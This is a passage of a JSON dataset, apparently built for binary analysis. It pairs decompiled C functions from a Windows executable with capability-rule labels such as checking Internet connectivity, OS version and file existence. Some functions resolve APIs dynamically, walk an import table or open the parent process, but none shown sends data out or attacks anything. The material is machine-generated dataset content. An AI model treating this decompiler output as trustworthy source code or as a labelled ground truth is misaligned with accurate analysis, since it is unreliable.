= iVar2 + 1;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    else {\n        iVar2 = 0;\n        if (-1 < iVar1) {\n            iVar1 = iVar1 + 1;\n            do {\n                if ((*(*arg_1ch + iVar2 * 0x10) & 0x4000) == 0x4000) {\n                    fcn.004107fc();\n                }\n                iVar2 = iVar2 + 1;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    fcn.00405a18(0);\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x47e4d3;\n    uStack44 = 0x47e4cb;\n    fcn.00405b44();\n    return;\n}\n",
        "token_count": 645
    },
    "0047e714": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.0047e714(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x44) != 0) {\n        return 3;\n    }\n    return *(in_EAX + 0x48);\n}\n",
        "token_count": 58
    },
    "0047e7dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0047e7dc(void)\n\n{\n    if (*0x485ce4 == 0) {\n        *0x485ce4 = sub.kernel32.dll_GetModuleHandleA_2(0x47e938);\n        if (*0x485ce4 != 0) {\n            *0x485ce8 = sub.kernel32.dll_GetProcAddress_1(*0x485ce4, 0x47e948);\n            *0x485cec = sub.kernel32.dll_GetProcAddress_1(*0x485ce4, 0x47e964);\n            *0x485cf0 = sub.kernel32.dll_GetProcAddress_1(*0x485ce4, 0x47e974);\n            *0x485cf4 = sub.kernel32.dll_GetProcAddress_1(*0x485ce4, 0x47e984);\n            *0x485cf8 = sub.kernel32.dll_GetProcAddress_1(*0x485ce4, 0x47e990);\n            *0x485cfc = sub.kernel32.dll_GetProcAddress_1(*0x485ce4, 0x47e99c);\n            *0x485d00 = sub.kernel32.dll_GetProcAddress_1(*0x485ce4, 0x47e9b8);\n            *0x485d04 = sub.kernel32.dll_GetProcAddress_1(*0x485ce4, 0x47e9c8);\n            *0x485d08 = sub.kernel32.dll_GetProcAddress_1(*0x485ce4, 0x47e9d8);\n            *0x485d0c = sub.kernel32.dll_GetProcAddress_1(*0x485ce4, 0x47e9e8);\n            *0x485d10 = sub.kernel32.dll_GetProcAddress_1(*0x485ce4, 0x47e9f8);\n            *0x485d14 = sub.kernel32.dll_GetProcAddress_1(*0x485ce4, 0x47ea08);\n            *0x485d18 = sub.kernel32.dll_GetProcAddress_1(*0x485ce4, 0x47ea18);\n            *0x485d1c = sub.kernel32.dll_GetProcAddress_1(*0x485ce4, 0x47ea28);\n            *0x485d20 = sub.kernel32.dll_GetProcAddress_1(*0x485ce4, 0x47ea38);\n            *0x485d24 = sub.kernel32.dll_GetProcAddress_1(*0x485ce4, 0x47ea48);\n        }\n    }\n    if ((*0x485ce4 != 0) && (*0x485ce8 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 597
    },
    "0047eaf8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047eaf8(void)\n\n{\n    int32_t iVar1;\n    \n    *0x485e60 = '\\0';\n    *0x485d28 = fcn.0047ea58();\n    if (*0x485d28 != -1) {\n        *0x485d2c = 0x128;\n        iVar1 = fcn.0047ea78();\n        if (iVar1 != 0) {\n            *0x485e54 = sub.kernel32.dll_GetCurrentProcessId();\n            do {\n                if (*0x485d34 == *0x485e54) {\n                    *0x485e5c = *0x485d44;\n                    *0x485e58 = sub.kernel32.dll_OpenProcess(0x410, 0, *0x485d44);\n                    if (*0x485e58 != 0) {\n                        *0x485e60 = '\\x01';\n                        fcn.00404c14();\n                        fcn.00404a88(0x1000);\n                        fcn.0047917c();\n                        fcn.00404a88();\n                        fcn.004047c0();\n                        sub.kernel32.dll_CloseHandle(*0x485e58);\n                    }\n                    break;\n                }\n                iVar1 = fcn.0047ea98();\n            } while (iVar1 != 0);\n        }\n        sub.kernel32.dll_CloseHandle(*0x485d28);\n    }\n    if (*0x485e60 != '\\0') {\n        fcn.0040461c();\n        return;\n    }\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 355
    },
    "0047ec20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047ec20(void)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x47ec36;\n    fcn.00404a78();\n    uStack32 = 0x47ed07;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    *0x485e94 = fcn.0047ea58();\n    *0x485e98 = 0x128;\n    iVar3 = fcn.0047ea78();\n    *0x485e90 = '\\x01' - (iVar3 == 0);\n    if (*0x485e90 != '\\0') {\n        fcn.00404838();\n        cVar2 = fcn.004089f4();\n        while (cVar2 == '\\0') {\n            iVar3 = fcn.0047ea98();\n            *0x485e90 = '\\x01' - (iVar3 == 0);\n            if (*0x485e90 == '\\0') break;\n            fcn.00404838();\n            cVar2 = fcn.004089f4();\n        }\n    }\n    uVar1 = *0x485e94;\n    sub.kernel32.dll_CloseHandle();\n    *in_FS_OFFSET = uVar1;\n    uStack32 = 0x47ed0e;\n    uStack36 = 0x47ed06;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 387
    },
    "0047ed3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047ed3c(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = 0x47ed56;\n    fcn.00404a78();\n    puStack36 = 0x47ed5e;\n    fcn.00404a78();\n    uStack40 = 0x47ee9f;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    uStack48 = fcn.00404a88();\n    iVar1 = func_0x00406da4();\n    if (iVar1 != 0) {\n        *0x485e6c = func_0x00406cec(uStack48);\n        if (*0x485e6c != 0) {\n            uVar2 = fcn.00404a88();\n            *0x485e78 = sub.kernel32.dll_GetProcAddress_1(*0x485e6c, uVar2);\n            sub.kernel32.dll_FreeLibrary_1(*0x485e6c);\n            fcn.00402d34();\n            fcn.0040461c();\n            fcn.00437578();\n            uVar2 = fcn.00404a88();\n            iVar1 = func_0x00406da4(uVar2);\n            if (iVar1 != 0) {\n                fcn.00437578();\n                uVar2 = fcn.00404a88();\n                *0x485e74 = func_0x00406cec(uVar2);\n                fcn.004047c0();\n                uVar2 = fcn.00404a88();\n                *0x485e8c = sub.kernel32.dll_GetProcAddress_1(*0x485e74, uVar2);\n                fcn.00402ed8(0x485e78, 4);\n                uVar2 = fcn.0047ec20();\n                (**0x485e8c)(uVar2);\n                uStack48 = *0x485e74;\n                sub.kernel32.dll_FreeLibrary_1();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack48;\n    uStack40 = 0x47eea6;\n    uStack44 = 0x47ee9e;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 584
    },
    "0047f120": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047f120(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    *0x485e70 = func_0x00406da4(0x47f278);\n    *0x485e84 = sub.kernel32.dll_GetProcAddress_1(*0x485e70, 0x47f284);\n    for (*0x485ffc = in_EAX; *(*0x485ffc + 0xc) != 0; *0x485ffc = *0x485ffc + 0x14) {\n        *0x48600c = *(*0x485ffc + 0xc) + *0x485fcc;\n        *0x485ff8 = func_0x00406da4(*0x48600c);\n        *0x486000 = *(*0x485ffc + 0x10) + *0x485fcc;\n        while( true ) {\n            if (**0x486000 == 0) break;\n            cVar1 = func_0x0047f114();\n            if (cVar1 == '\\0') {\n                *0x486004 = **0x486000 + *0x485fcc + 2;\n                *0x486008 = (**0x485e84)(*0x485ff8, *0x486004);\n            }\n            else {\n                *0x486008 = (**0x485e84)(*0x485ff8, **0x486000 & 0xffff);\n            }\n            **0x486000 = *0x486008;\n            *0x486000 = *0x486000 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 370
    },
    "004800d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004800d8(uint param_1, uint param_2)\n\n{\n    int32_t **in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack24 = 0x4800f2;\n    var_4h = param_2;\n    fcn.00404a78();\n    uStack28 = 0x4801d9;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    (**(**in_EAX + 0x44))();\n    fcn.0040461c();\n    fcn.0040461c();\n    while( true ) {\n        *0x486064 = fcn.00404bcc();\n        if (*0x486064 == 0) break;\n        fcn.00404ae8(&fcn.004800d8::var_8h);\n        (**(**in_EAX + 0x38))();\n        uStack32 = 0x486068;\n        fcn.00404888();\n        fcn.00404ae8();\n    }\n    (**(**in_EAX + 0x38))();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x4801e0;\n    uStack28 = 0x4801d8;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 349
    },
    "00408fac": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00408fac(uint param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0xffffffff;\n    if (((param_2 & 3) < 3) && ((param_2 & 0xf0) < 0x41)) {\n        uVar1 = fcn.00404a88(*((param_2 & 3) * 4 + 0x483144), *(((param_2 & 0xf0) >> 4) * 4 + 0x483150), 0, 3, 0x80, 0);\n        uVar1 = sub.kernel32.dll_CreateFileA(uVar1);\n    }\n    return uVar1;\n}\n",
        "token_count": 166
    },
    "004090c8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004090c8(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = fcn.00404888(param_1);\n    if (iVar2 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        while (cVar1 = fcn.0040d2e0(),  cVar1 == '\\x02') {\n            iVar2 = iVar2 + -1;\n        }\n        iVar2 = in_EAX + -1 + iVar2;\n    }\n    return CONCAT44(iVar2, iVar2);\n}\n",
        "token_count": 142
    },
    "00409100": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00409100(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    iVar2 = fcn.00404888(param_1);\n    uVar3 = fcn.00404a88();\n    for (; 0 < iVar2; iVar2 = iVar2 + -1) {\n        if ((*(param_2 + -1 + iVar2) != '\\0') && (iVar4 = fcn.00409420(),  iVar4 != 0)) {\n            cVar1 = fcn.0040d2e0();\n            if (cVar1 != '\\x02') break;\n            iVar2 = iVar2 + -1;\n        }\n    }\n    return CONCAT44(uVar3, iVar2);\n}\n",
        "token_count": 188
    },
    "00409c59": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409c59(uint arg_8h, uint noname_1, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    char *unaff_EDI;\n    char *pcVar5;\n    char *pcVar6;\n    uint var_2ch;\n    uint var_5h;\n    \n    uVar3 = *(unaff_EBP + 8);\n    if (0x11 < uVar3) {\n        uVar3 = 0x12;\n    }\n    iVar2 = *(unaff_EBP + -0x2c);\n    if (iVar2 < 1) {\n        pcVar5 = unaff_EDI + 1;\n        *unaff_EDI = '0';\n    }\n    else {\n        iVar4 = 0;\n        if (*(unaff_EBP + 0x10) != '\\x02') {\n            iVar4 = (*(unaff_EBP + -0x2c) - 1U) % 3 + 1;\n        }\n        while( true ) {\n            pcVar6 = unaff_EDI;\n            cVar1 = fcn.00409bae();\n            pcVar5 = pcVar6 + 1;\n            *pcVar6 = cVar1;\n            iVar2 = extraout_ECX + -1;\n            uVar3 = extraout_EDX;\n            if (iVar2 == 0) break;\n            iVar4 = iVar4 + -1;\n            unaff_EDI = pcVar5;\n            if ((iVar4 == 0) && (*(unaff_EBP + -6) != '\\0')) {\n                *pcVar5 = *(unaff_EBP + -6);\n                iVar4 = 3;\n                unaff_EDI = pcVar6 + 2;\n            }\n        }\n    }\n    if (uVar3 != 0) {\n        pcVar6 = pcVar5;\n        if (*(unaff_EBP + -5) != '\\0') {\n            pcVar6 = pcVar5 + 1;\n            *pcVar5 = *(unaff_EBP + -5);\n        }\n        for (; iVar2 != 0; iVar2 = iVar2 + 1) {\n            *pcVar6 = '0';\n            uVar3 = uVar3 - 1;\n            if (uVar3 == 0) {\n                return;\n            }\n            pcVar6 = pcVar6 + 1;\n        }\n        do {\n            cVar1 = fcn.00409bae();\n            *pcVar6 = cVar1;\n            pcVar6 = pcVar6 + 1;\n        } while (extraout_EDX_00 != 1);\n    }\n    return;\n}\n",
        "token_count": 643
    },
    "0040adbc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040adbc(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char **in_EDX;\n    uint *in_FS_OFFSET;\n    char **ppcStackY328;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack296 = 0x40ae9a;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed4;\n    fcn.004045c8();\n    var_14h._0_2_ = *(arg_8h + -0xe);\n    var_14h._2_2_ = *(arg_8h + -0x10);\n    var_eh._0_2_ = *(arg_8h + -0x12);\n    if (in_EAX < 3) {\n        fcn.00404660();\n    }\n    else {\n        fcn.00404660();\n    }\n    uVar1 = fcn.00404a88(&fcn.0040adbc::var_114h, 0x100);\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1(4, &fcn.0040adbc::var_14h, uVar1);\n    ppcStackY328 = 0x40ae4d;\n    iVar2 = sub.kernel32.dll_GetDateFormatA(uVar1);\n    if (iVar2 != 0) {\n        ppcStackY328 = 0x40ae63;\n        fcn.00404838();\n        if ((in_EAX == 1) && (**in_EDX == '0')) {\n            fcn.00404888();\n            fcn.00404ae8();\n            ppcStackY328 = in_EDX;\n        }\n    }\n    *in_FS_OFFSET = ppcStackY328;\n    fcn.004045c8(0x40aea1);\n    return;\n}\n",
        "token_count": 493
    },
    "0040d8a4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0040d8a4(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uchar uVar6;\n    uint lpCharType;\n    uint var_98h;\n    uint *lpSrcStr;\n    \n    *0x485744 = 0x409;\n    *0x485748 = 9;\n    *0x48574c = 1;\n    uVar2 = sub.kernel32.dll_GetThreadLocale_1();\n    if (uVar2 != 0) {\n        *0x485744 = uVar2;\n    }\n    if (uVar2 != 0) {\n        *0x485748 = uVar2 & 0x3ff;\n        *0x48574c = (uVar2 & 0xffff) >> 10;\n    }\n    puVar4 = 0x40d9fc;\n    puVar5 = 0x483110;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    if (*0x4830c8 == 2) {\n        cVar1 = fcn.0040d88c();\n        uVar6 = cVar1 == '\\0';\n        if (uVar6) {\n            fcn.0040d82c(&stack0xfffffffc);\n            fcn.00403354();\n            *0x485750 = !uVar6;\n            if (*0x485750) {\n                *0x485751 = 0;\n            }\n            else {\n                iVar3 = 0x80;\n                puVar4 = &var_98h;\n                do {\n                    *puVar4 = iVar3;\n                    iVar3 = iVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                } while (iVar3 != 0x100);\n                lpSrcStr = &var_98h;\n                sub.kernel32.dll_GetStringTypeExA(*0x485744, 2, lpSrcStr, 0x80, &lpCharType);\n                iVar3 = 0x80;\n                puVar4 = &lpCharType;\n                do {\n                    *0x485751 = *puVar4 == 2;\n                    if (*0x485751) {\n                        return;\n                    }\n                    puVar4 = puVar4 + 2;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n        }\n        else {\n            *0x485751 = 0;\n            *0x485750 = 0;\n        }\n    }\n    else {\n        iVar3 = sub.user32.dll_GetSystemMetrics(0x4a);\n        *0x485751 = iVar3 != 0;\n        iVar3 = sub.user32.dll_GetSystemMetrics(0x2a);\n        *0x485750 = iVar3 != 0;\n        if (*0x485750) {\n            fcn.0040d82c(&stack0xfffffffc);\n        }\n    }\n    return;\n}\n",
        "token_count": 711
    },
    "00414f44": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00414f44(uint32_t param_1, uint8_t param_2)\n\n{\n    char in_AL;\n    int32_t iVar1;\n    uint unaff_EBX;\n    unkbyte3 Var3;\n    uint32_t uVar2;\n    uint32_t uStack8;\n    \n    uStack8 = param_1 & 0xffffff00 | param_2;\n    Var3 = unaff_EBX >> 8;\n    uVar2 = CONCAT31(Var3, 1);\n    if (param_1 == 0xe) {\n        if (*0x483444 == '\\0') {\n            fcn.0040fd78();\n        }\n        else if (*0x483444 == '\\x01') {\n            uVar2 = uVar2 & 0xffffff00 | *0x483490;\n        }\n        else if (*0x483444 == '\\x02') {\n            if ((in_AL == '\\x02') && (param_2 == 2)) {\n                iVar1 = 1;\n            }\n            else {\n                iVar1 = 0;\n            }\n            uVar2 = uVar2 & 0xffffff00 | *(iVar1 + 0x483490);\n        }\n    }\n    else if (param_1 == 0xf) {\n        if (*0x483444 == '\\0') {\n            fcn.0040fd78();\n        }\n        else if (*0x483444 == '\\x01') {\n            uVar2 = uVar2 & 0xffffff00 | *0x483492;\n        }\n        else if (*0x483444 == '\\x02') {\n            if ((in_AL == '\\x02') && (param_2 == 2)) {\n                iVar1 = 0;\n            }\n            else {\n                iVar1 = 1;\n            }\n            uVar2 = uVar2 & 0xffffff00 | *(iVar1 + 0x483492);\n        }\n    }\n    else if (param_1 - 0x10 < 4) {\n        if (*0x483448 == '\\0') {\n            fcn.0040fd78();\n        }\n        else if (*0x483448 == '\\x01') {\n            uVar2 = uVar2 & 0xffffff00 | *(param_1 * 2 + 0x483474);\n        }\n        else if (*0x483448 == '\\x02') {\n            if (in_AL == '\\x02') {\n                if (param_2 == 2) {\n                    uVar2 = CONCAT31(Var3, 1);\n                }\n                else {\n                    uVar2 = 0;\n                }\n            }\n            else {\n                uVar2 = CONCAT31(Var3, 2);\n            }\n        }\n    }\n    else {\n        fcn.0040fd24();\n    }\n    return CONCAT44(uStack8, uVar2);\n}\n",
        "token_count": 623
    },
    "004186b0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004186b0(uint param_1, uint *param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    uint8_t uVar4;\n    \n    pcVar1 = **param_2;\n    uVar4 = 4;\n    if (*pcVar1 != '\\a') {\n        uVar4 = pcVar1[pcVar1[1] + 2];\n    }\n    pcVar2 = param_2[2];\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar3 = in_EAX + (pcVar2 & 0xffffff);\n        *puVar3 = param_1;\n        if ((1 < uVar4) && (*puVar3 = param_1,  3 < uVar4)) {\n            *puVar3 = param_1;\n        }\n    }\n    else if (*(param_2 + 0xb) < 0xfe) {\n        (*pcVar2)();\n    }\n    else {\n        (**(pcVar2 + *in_EAX))();\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "00423394": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00423394(int32_t arg_8h, uint arg_ch, uint noname_2, int32_t arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4233fe;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    if ((arg_14h < 0) || (2 < arg_14h)) {\n        uVar2 = 0x80030001;\n        *in_FS_OFFSET = uStack36;\n    }\n    else {\n        iVar1 = (**(**(arg_8h + 0xc) + 0x14))();\n        if (arg_18h != NULL) {\n            *arg_18h = iVar1;\n            arg_18h[1] = iVar1 >> 0x1f;\n        }\n        uVar2 = 0;\n        *in_FS_OFFSET = uStack36;\n    }\n    return uVar2;\n}\n",
        "token_count": 283
    },
    "0043b540": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043b540(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint lParam;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0;\n    if (in_EAX != 0) {\n        uVar1 = sub.user32.dll_SendMessageA();\n    }\n    return uVar1;\n}\n",
        "token_count": 115
    },
    "00450964": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.00450964(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    \n    uVar7 = 0;\n    piVar4 = fcn.004508a8();\n    if (piVar4 == NULL) {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            cVar3 = fcn.004039b8();\n            if (cVar3 != '\\0') {\n                fcn.0044f97c();\n            }\n        }\n    }\n    else {\n        if ((*(piVar4 + 7) & 0x10) == 0) {\n            fcn.0044f97c();\n        }\n        (**(*piVar4 + 0x44))();\n        uVar5 = fcn.00450014();\n        uVar2 = fcn.00450510();\n        if ((uVar5 | uVar2) != 0) {\n            fcn.0044d878();\n        }\n        uVar1 = *(**0x48466c + 0x44);\n        uVar5 = uVar5 & 0xffffff00;\n        if (((uVar1 != 0) && (uVar5 = uVar1,  *(uVar1 + 0x22f) == '\\x02')) && (piVar4 == *(uVar1 + 600))) {\n            iVar6 = sub.user32.dll_SendMessageA(*(uVar1 + 0x254), 0x234, 0, 0);\n            if (iVar6 != 0) {\n                uVar7 = fcn.0044407c();\n                sub.user32.dll_DrawMenuBar(uVar7);\n            }\n        }\n        uVar7 = CONCAT31(uVar5 >> 8, 1);\n    }\n    return uVar7;\n}\n",
        "token_count": 449
    },
    "00456d1c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00456d1c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.004571f8();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.00457244();\n            if (*(iVar2 + 0x22b) == '\\x02') {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 125
    },
    "004577d0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.004577d0(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0xff000005;\n    if (*(in_EAX + 0x22f) == '\\x02') {\n        uVar1 = 0xff00000c;\n    }\n    return uVar1;\n}\n",
        "token_count": 78
    },
    "0045f754": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0045f754(uint param_1, uint16_t param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    \n    if (param_2 == 2) {\n        cVar2 = fcn.0040a810();\n        if (cVar2 != '\\0') {\n            iVar3 = 1;\n            goto code_r0x0045f771;\n        }\n    }\n    iVar3 = 0;\ncode_r0x0045f771:\n    uVar1 = *0x4845d4 + iVar3 * 0x18;\n    return uVar1 & 0xffff0000 | *((uVar1 - 2) + param_2 * 2);\n}\n",
        "token_count": 171
    },
    "0046dee0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
